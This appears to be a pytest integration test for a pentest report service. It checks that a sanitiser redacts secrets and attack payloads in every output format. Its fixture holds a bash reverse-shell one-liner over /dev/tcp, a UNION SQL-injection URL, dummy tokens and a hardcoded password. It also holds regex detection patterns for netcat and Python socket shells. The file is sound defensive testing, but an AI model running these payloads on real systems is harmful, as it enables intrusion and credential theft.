"""ARG-025 — Integration: ReportService Asgard tier × all six formats.

Mirrors :mod:`tests.integration.reports.test_midgard_tier_all_formats` but
exercises the Asgard branch end-to-end: tier classifier (sanitiser),
``AsgardSectionAssembly`` build, format dispatcher, ``ReportBundle``
SHA-256, and snapshot byte-equality.

Per ARG-025 Definition-of-Done:

* every ``ReportFormat`` (HTML / PDF / JSON / CSV / SARIF / JUnit)
  succeeds for the Asgard tier (PDF skip-on-missing-WeasyPrint);
* the sanitised reproducer text appears in every machine output;
* no raw bearer / API-key / password / reverse-shell payload survives in
  any output (regex sweep);
* JSON / CSV / SARIF / JUnit bytes match the canonical Asgard snapshot
  fixtures under ``backend/tests/snapshots/reports/``.

Refresh fixtures with ``$env:ARGUS_SNAPSHOT_REFRESH = "1"; pytest …``.
"""

from __future__ import annotations

import json
import os
import re
from collections.abc import Iterator
from pathlib import Path
from typing import Final

import pytest
from src.api.schemas import Finding, ReportSummary
from src.reports.asgard_tier_renderer import assemble_asgard_sections
from src.reports.generators import (
    EvidenceEntry,
    PhaseOutputEntry,
    ReportData,
    ScreenshotEntry,
    TimelineEntry,
)
from src.reports.replay_command_sanitizer import (
    PLACEHOLDER_ASSET,
    PLACEHOLDER_ENDPOINT,
    REDACTED_BEARER,
    REDACTED_PASSWORD,
    REDACTED_REVERSE_SHELL,
    SanitizeContext,
)
from src.reports.report_bundle import ReportFormat, ReportTier
from src.reports.report_service import (
    ReportGenerationError,
    ReportService,
)


# ---------------------------------------------------------------------------
# Snapshot directory + refresh policy (shared with ARG-024)
# ---------------------------------------------------------------------------


SNAPSHOT_DIR: Final[Path] = (
    Path(__file__).resolve().parents[2] / "snapshots" / "reports"
)
SNAPSHOT_REFRESH_ENV: Final[str] = "ARGUS_SNAPSHOT_REFRESH"
SNAPSHOT_TOOL_VERSION: Final[str] = "arg-025-snapshot"


def _snapshot_path(fmt: ReportFormat) -> Path:
    extension_overrides = {ReportFormat.JUNIT: "xml"}
    ext = extension_overrides.get(fmt, fmt.value)
    return SNAPSHOT_DIR / f"asgard_canonical.{ext}"


def _refresh_requested() -> bool:
    return os.environ.get(SNAPSHOT_REFRESH_ENV, "").strip() not in (
        "",
        "0",
        "false",
        "False",
    )


# ---------------------------------------------------------------------------
# Canonical Asgard fixture — exercise sanitiser hot paths
# ---------------------------------------------------------------------------


@pytest.fixture
def asgard_report_data() -> ReportData:
    """Asgard input rich enough to cover every renderer + sanitiser branch."""
    summary = ReportSummary(
        critical=1,
        high=2,
        medium=1,
        low=1,
        info=0,
        technologies=["nginx", "django"],
        sslIssues=1,
        headerIssues=2,
        leaksFound=False,
    )
    findings = [
        Finding(
            severity="critical",
            title="SQLi at /api/v1/users",
            description="UNION-based SQLi via id parameter.",
            cwe="CWE-89",
            cvss=9.8,
            owasp_category="A05",
            confidence="confirmed",
            evidence_type="tool_output",
            evidence_refs=["s3://argus-evidence/sqli-dump"],
            applicability_notes="Patch ORM and parameterise the id field.",
            proof_of_concept={
                "replay_command": [
                    "curl",
                    "-H",
                    "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload.sig",
                    "https://acme.example.com/api/v1/users?id=1' UNION SELECT 1,2,3--",
                ]
            },
        ),
        Finding(
            severity="high",
            title="Reverse shell PoC in /upload",
            description="File upload allows RCE; PoC included.",
            cwe="CWE-78",
            cvss=8.6,
            owasp_category="A01",
            confidence="confirmed",
            evidence_type="tool_output",
            applicability_notes="Reject non-image MIME types and run the worker as a non-root user.",
            proof_of_concept={
                "replay_command": [
                    "sh",
                    "-c",
                    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
                ]
            },
        ),
        Finding(
            severity="high",
            title="GitHub PAT leaked in JS bundle",
            description="ghp_* token observed in /static/app.js.",
            cwe="CWE-200",
            cvss=7.5,
            owasp_category="A04",
            confidence="confirmed",
            evidence_type="tool_output",
            applicability_notes="Rotate token and migrate to fine-grained PAT.",
            proof_of_concept={
                "reproducer": (
                    "curl -H 'Authorization: token "
                    "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789' "
                    "https://api.github.com/user"
                ),
            },
        ),
        Finding(
            severity="medium",
            title="Missing security headers",
            description="No CSP / HSTS / X-Frame-Options.",
            cwe="CWE-693",
            owasp_category="A02",
            confidence="likely",
            evidence_type="tool_output",
            reproducible_steps="curl -I https://acme.example.com/",
        ),
        Finding(
            severity="low",
            title="MySQL root password observed in CI script",
            description="Hardcoded password in deploy script.",
            cwe="CWE-798",
            owasp_category="A07",
            confidence="possible",
            evidence_type="tool_output",
            proof_of_concept={
                "replay_command": [
                    "mysql",
                    "-u",
                    "root",
                    "--password=hunter2",
                    "-h",
                    "acme.example.com",
                    "-e",
                    "SHOW DATABASES;",
                ]
            },
        ),
    ]
    return ReportData(
        report_id="r-int-asgard-1",
        target="https://acme.example.com",
        summary=summary,
        findings=findings,
        technologies=["nginx", "django"],
        scan_id="scan-int-asgard-1",
        tenant_id="tenant-int-asgard-1",
        evidence=[
            EvidenceEntry(
                finding_id="f1",
                object_key="evidence/sqli/dump.txt",
                description="HTTP req/resp dump",
            ),
            EvidenceEntry(
                finding_id="f2",
                object_key="evidence/upload/payload.bin",
                description="Reverse-shell artefact",
            ),
        ],
        screenshots=[
            ScreenshotEntry(object_key="screenshots/login.png", url_or_email="login"),
        ],
        timeline=[
            TimelineEntry(
                phase="recon",
                order_index=0,
                entry={"phase": "started"},
                created_at="2026-04-19T10:00:00Z",
            ),
            TimelineEntry(
                phase="exploit",
                order_index=1,
                entry={"phase": "rce"},
                created_at="2026-04-19T11:00:00Z",
            ),
        ],
        phase_outputs=[PhaseOutputEntry(phase="recon", output_data={"k": "v"})],
        executive_summary="Critical SQLi and RCE; rotate exposed credentials immediately.",
        remediation=["Patch ORM.", "Disable unrestricted upload.", "Rotate all PATs."],
        ai_insights=["LLM exec summary"],
        raw_artifacts=[{"raw": "recon dump"}],
        hibp_pwned_password_summary={"pwned_count": 12},
        created_at="2026-04-19T10:00:00Z",
    )


@pytest.fixture
def service() -> ReportService:
    return ReportService(tool_version=SNAPSHOT_TOOL_VERSION)


@pytest.fixture
def sanitize_context() -> SanitizeContext:
    return SanitizeContext(
        target="https://acme.example.com",
        endpoints=("https://acme.example.com/api/v1/users",),
        canaries=("CANARY-OBS-1",),
    )


@pytest.fixture
def presigner() -> object:
    def _presign(key: str) -> str | None:
        return f"https://signed.example/{key}?sig=fake"

    return _presign


# ---------------------------------------------------------------------------
# Per-format coverage smoke tests
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "fmt",
    [
        ReportFormat.JSON,
        ReportFormat.CSV,
        ReportFormat.SARIF,
        ReportFormat.JUNIT,
    ],
)
def test_asgard_renders_machine_format(
    service: ReportService,
    asgard_report_data: ReportData,
    sanitize_context: SanitizeContext,
    presigner: object,
    fmt: ReportFormat,
) -> None:
    bundle = service.render_bundle(
        asgard_report_data,
        tier=ReportTier.ASGARD,
        fmt=fmt,
        sanitize_context=sanitize_context,
        presigner=presigner,  # type: ignore[arg-type]
    )
    assert bundle.tier is ReportTier.ASGARD
    assert bundle.format is fmt
    assert bundle.size_bytes > 0
    assert bundle.size_bytes == len(bundle.content)
    assert bundle.verify_sha256()


def test_asgard_html_renders(
    service: ReportService,
    asgard_report_data: ReportData,
    sanitize_context: SanitizeContext,
) -> None:
    bundle = service.render_bundle(
        asgard_report_data,
        tier=ReportTier.ASGARD,
        fmt=ReportFormat.HTML,
        sanitize_context=sanitize_context,
    )
    assert bundle.size_bytes > 0
    body = bundle.content.decode("utf-8", errors="replace").lower()
    assert "<html" in body or "<!doctype html" in body


@pytest.mark.weasyprint_pdf
def test_asgard_pdf_renders_or_skips(
    service: ReportService,
    asgard_report_data: ReportData,
    sanitize_context: SanitizeContext,
) -> None:
    if os.environ.get("ARGUS_SKIP_WEASYPRINT_PDF"):
        pytest.skip("ARGUS_SKIP_WEASYPRINT_PDF set")
    try:
        bundle = service.render_bundle(
            asgard_report_data,
            tier=ReportTier.ASGARD,
            fmt=ReportFormat.PDF,
            sanitize_context=sanitize_context,
        )
    except ReportGenerationError:
        pytest.skip("WeasyPrint native libraries not available on this host")
    assert bundle.size_bytes > 0
    assert bundle.content[:5] == b"%PDF-"


# ---------------------------------------------------------------------------
# Sanitiser proof — ZERO secrets / destructive payloads in any output
# ---------------------------------------------------------------------------


_FORBIDDEN_LITERALS: Final[tuple[bytes, ...]] = (
    b"eyJhbGciOiJIUzI1NiJ9.payload.sig",
    b"ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789",
    b"hunter2",
    b"/dev/tcp",
    b"bash -i >&",
    b"--password=hunter2",
)


# NB: placeholders like ``[REDACTED-PASSWORD]`` are EXCLUDED from these
# patterns; we only fail on raw secret material.
_FORBIDDEN_REGEXES: Final[tuple[re.Pattern[bytes], ...]] = (
    re.compile(rb"Bearer\s+ey[A-Za-z0-9._-]+"),
    re.compile(rb"\bAKIA[0-9A-Z]{16}\b"),
    re.compile(rb"\bghp_[A-Za-z0-9]{20,}\b"),
    re.compile(rb"\bglpat-[A-Za-z0-9_\-]{16,}\b"),
    re.compile(rb"\bxox[bpos]-[A-Za-z0-9-]{8,}\b"),
    re.compile(rb"\bnc\b[^|]{0,80}\s-e\b", re.IGNORECASE),
    re.compile(rb"\bpython[23]?\s+-c\s+['\"][^'\"]*import\s+socket"),
    re.compile(rb"\bpassword\s*=\s*(?!\[REDACTED)[^\s\&\"]{4,}", re.IGNORECASE),
)


@pytest.mark.parametrize(
    "fmt",
    [
        ReportFormat.JSON,
        ReportFormat.CSV,
        ReportFormat.SARIF,
        ReportFormat.JUNIT,
        ReportFormat.HTML,
    ],
)
def test_asgard_no_secret_leak_in_any_format(
    service: ReportService,
    asgard_report_data: ReportData,
    sanitize_context: SanitizeContext,
    presigner: object,
    fmt: ReportFormat,
) -> None:
    bundle = service.render_bundle(
        asgard_report_data,
        tier=ReportTier.ASGARD,
        fmt=fmt,
        sanitize_context=sanitize_context,
        presigner=presigner,  # type: ignore[arg-type]
    )
    blob = bundle.content
    for needle in _FORBIDDEN_LITERALS:
        assert needle not in blob, (
            f"raw secret literal leaked into {fmt.value}: {needle!r}"
        )
    for pattern in _FORBIDDEN_REGEXES:
        match = pattern.search(blob)
        assert match is None, f"raw secret regex leaked into {fmt.value}: {match!r}"


@pytest.mark.parametrize(
    "fmt",
    [ReportFormat.JSON, ReportFormat.HTML],
)
def test_asgard_sanitised_reproducer_visible_in_output(
    service: ReportService,
    asgard_report_data: ReportData,
    sanitize_context: SanitizeContext,
    fmt: ReportFormat,
) -> None:
    """A redacted placeholder MUST surface in machine + HTML output so the
    reader knows the sanitiser actually fired (silent stripping is an
    auditing antipattern).

    SARIF deliberately omits the raw PoC body (see ``sarif_generator``
    docstring: "never embed raw PoC bodies"), so SARIF is not part of
    this contract."""
    bundle = service.render_bundle(
        asgard_report_data,
        tier=ReportTier.ASGARD,
        fmt=fmt,
        sanitize_context=sanitize_context,
    )
    text = bundle.content.decode("utf-8", errors="replace")
    placeholders = (
        REDACTED_BEARER,
        REDACTED_REVERSE_SHELL,
        REDACTED_PASSWORD,
        PLACEHOLDER_ASSET,
        PLACEHOLDER_ENDPOINT,
    )
    assert any(ph in text for ph in placeholders), (
        f"no sanitiser placeholder visible in {fmt.value} output"
    )


# ---------------------------------------------------------------------------
# Sanitiser proof — reproducer command actually present in JSON
# ---------------------------------------------------------------------------


def test_asgard_json_includes_reproducer_section(
    service: ReportService,
    asgard_report_data: ReportData,
    sanitize_context: SanitizeContext,
    presigner: object,
) -> None:
    bundle = service.render_bundle(
        asgard_report_data,
        tier=ReportTier.ASGARD,
        fmt=ReportFormat.JSON,
        sanitize_context=sanitize_context,
        presigner=presigner,  # type: ignore[arg-type]
    )
    payload = json.loads(bundle.content)
    assert isinstance(payload, dict)
    # JSON generator emits the asgard_report blob through Jinja minimal context.
    asgard_report = payload.get("asgard_report")
    assert isinstance(asgard_report, dict), "asgard_report missing from JSON"
    assert asgard_report.get("reproducer"), "reproducer rows missing"
    cmds = [" ".join(r["command"]) for r in asgard_report["reproducer"]]
    assert any(REDACTED_BEARER in c for c in cmds)
    assert any(REDACTED_REVERSE_SHELL in c for c in cmds)
    assert any(REDACTED_PASSWORD in c for c in cmds)


def test_asgard_assembly_round_trip(
    asgard_report_data: ReportData,
    sanitize_context: SanitizeContext,
) -> None:
    """The pure-function assembler stays deterministic across calls."""
    a = assemble_asgard_sections(asgard_report_data, sanitize_context=sanitize_context)
    b = assemble_asgard_sections(asgard_report_data, sanitize_context=sanitize_context)
    assert a.model_dump_json() == b.model_dump_json()


# ---------------------------------------------------------------------------
# Determinism + bundle envelope
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "fmt",
    [ReportFormat.JSON, ReportFormat.CSV, ReportFormat.SARIF, ReportFormat.JUNIT],
)
def test_asgard_byte_identical_across_runs(
    service: ReportService,
    asgard_report_data: ReportData,
    sanitize_context: SanitizeContext,
    presigner: object,
    fmt: ReportFormat,
) -> None:
    a = service.render_bundle(
        asgard_report_data,
        tier=ReportTier.ASGARD,
        fmt=fmt,
        sanitize_context=sanitize_context,
        presigner=presigner,  # type: ignore[arg-type]
    )
    b = service.render_bundle(
        asgard_report_data,
        tier=ReportTier.ASGARD,
        fmt=fmt,
        sanitize_context=sanitize_context,
        presigner=presigner,  # type: ignore[arg-type]
    )
    assert a.content == b.content
    assert a.sha256 == b.sha256


# ---------------------------------------------------------------------------
# Snapshot byte-equality (golden files under tests/snapshots/reports/)
# ---------------------------------------------------------------------------


def _refresh_or_assert(actual: bytes, snapshot: Path) -> None:
    if _refresh_requested() or not snapshot.exists():
        snapshot.parent.mkdir(parents=True, exist_ok=True)
        snapshot.write_bytes(actual)
        return
    expected = snapshot.read_bytes()
    if actual != expected:  # pragma: no cover — bytewise compare
        raise AssertionError(
            f"Snapshot mismatch for {snapshot.name} "
            f"(expected={len(expected)} bytes, actual={len(actual)} bytes); "
            f"refresh with $env:{SNAPSHOT_REFRESH_ENV}=1"
        )


@pytest.fixture
def snapshot_dir() -> Iterator[Path]:
    SNAPSHOT_DIR.mkdir(parents=True, exist_ok=True)
    yield SNAPSHOT_DIR


@pytest.mark.parametrize(
    "fmt",
    [ReportFormat.JSON, ReportFormat.CSV, ReportFormat.SARIF, ReportFormat.JUNIT],
)
def test_asgard_snapshot_bytes_stable(
    service: ReportService,
    asgard_report_data: ReportData,
    sanitize_context: SanitizeContext,
    snapshot_dir: Path,
    fmt: ReportFormat,
) -> None:
    bundle = service.render_bundle(
        asgard_report_data,
        tier=ReportTier.ASGARD,
        fmt=fmt,
        sanitize_context=sanitize_context,
    )
    _refresh_or_assert(bundle.content, _snapshot_path(fmt))


# ---------------------------------------------------------------------------
# Tier-isolation: Asgard adds reproducer rows that Midgard MUST NOT show.
# ---------------------------------------------------------------------------


def test_midgard_does_not_emit_asgard_reproducer(
    service: ReportService,
    asgard_report_data: ReportData,
    sanitize_context: SanitizeContext,
) -> None:
    midgard_json = service.render_bundle(
        asgard_report_data,
        tier=ReportTier.MIDGARD,
        fmt=ReportFormat.JSON,
        sanitize_context=sanitize_context,
    )
    midgard_payload = json.loads(midgard_json.content)
    assert "asgard_report" not in midgard_payload


# ---------------------------------------------------------------------------
# HTML snapshot — bytewise stable (Jinja output is deterministic)
# ---------------------------------------------------------------------------


def test_asgard_html_snapshot_bytes_stable(
    service: ReportService,
    asgard_report_data: ReportData,
    sanitize_context: SanitizeContext,
    snapshot_dir: Path,
) -> None:
    """HTML output is pure Jinja → byte-stable across runs and across hosts.

    The snapshot guards against accidental template / context drift. Refresh
    with ``$env:ARGUS_SNAPSHOT_REFRESH = "1"; pytest`` after intentional
    template changes.
    """
    bundle = service.render_bundle(
        asgard_report_data,
        tier=ReportTier.ASGARD,
        fmt=ReportFormat.HTML,
        sanitize_context=sanitize_context,
    )
    _refresh_or_assert(bundle.content, _snapshot_path(ReportFormat.HTML))


# ---------------------------------------------------------------------------
# PDF structural snapshot — page count + presence of expected text
# ---------------------------------------------------------------------------
#
# WeasyPrint embeds a creation timestamp in every PDF, so byte-identity is
# impossible. Instead we assert structural invariants that any future
# template tweak must preserve.


def test_asgard_pdf_structural_snapshot(
    service: ReportService,
    asgard_report_data: ReportData,
    sanitize_context: SanitizeContext,
) -> None:
    pypdf = pytest.importorskip(
        "pypdf",
        reason="pypdf required to assert PDF structural invariants",
    )
    try:
        bundle = service.render_bundle(
            asgard_report_data,
            tier=ReportTier.ASGARD,
            fmt=ReportFormat.PDF,
            sanitize_context=sanitize_context,
        )
    except ReportGenerationError as exc:
        if "weasyprint" in str(exc).lower() or "pdf" in str(exc).lower():
            pytest.skip(f"WeasyPrint unavailable on this host: {exc}")
        raise

    blob = bundle.content
    assert blob.startswith(b"%PDF-"), "PDF output missing magic header"

    from io import BytesIO

    reader = pypdf.PdfReader(BytesIO(blob))
    page_count = len(reader.pages)
    assert page_count >= 1, "Asgard PDF must have at least one page"

    extracted = "".join(page.extract_text() or "" for page in reader.pages)

    assert "Asgard" in extracted or "asgard" in extracted.lower(), (
        "Asgard PDF must declare its tier somewhere in body text"
    )
    assert "SQLi" in extracted, "Critical finding title missing from PDF body"
    assert REDACTED_BEARER in extracted, (
        "Sanitised bearer placeholder missing from PDF body"
    )
